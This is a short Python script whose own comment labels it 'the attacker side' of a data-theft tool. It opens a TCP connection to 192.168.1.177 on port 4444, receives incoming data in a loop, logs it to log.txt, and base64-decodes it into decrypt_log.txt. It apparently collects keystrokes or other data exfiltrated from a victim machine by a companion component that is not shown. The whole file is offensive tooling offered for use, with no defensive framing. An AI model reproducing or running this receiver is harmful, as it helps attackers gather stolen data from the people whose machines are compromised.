import socket, sys, threading, os
from src import base64cipher
from time import sleep

host, port = '192.168.1.177', 4444


# Static function that decode the log.txt file
def decode_text():
    flog = open('log.txt', 'r')
    fdecrypt = open('decrypt_log.txt', 'a')
    for line in flog:
        print('line decrypted:' + base64cipher.decodeMsg(line))
        fdecrypt.write(base64cipher.decodeMsg(line))
    fdecrypt.flush()
    os.fsync(fdecrypt.fileno())
    flog.close()
    fdecrypt.close()


# This class describe the attacker side
class recv_data:
    mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mysocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    mysocket.connect((host, port))

    def __init__(self):
        # data = self.mysocket.recv(1024)
        f = open('log.txt', 'wb')
        while True:
            data = self.mysocket.recv(1024, False)
            # print(data)
            f.write(data)
            decode_text()
            # f.flush()


re = recv_data()
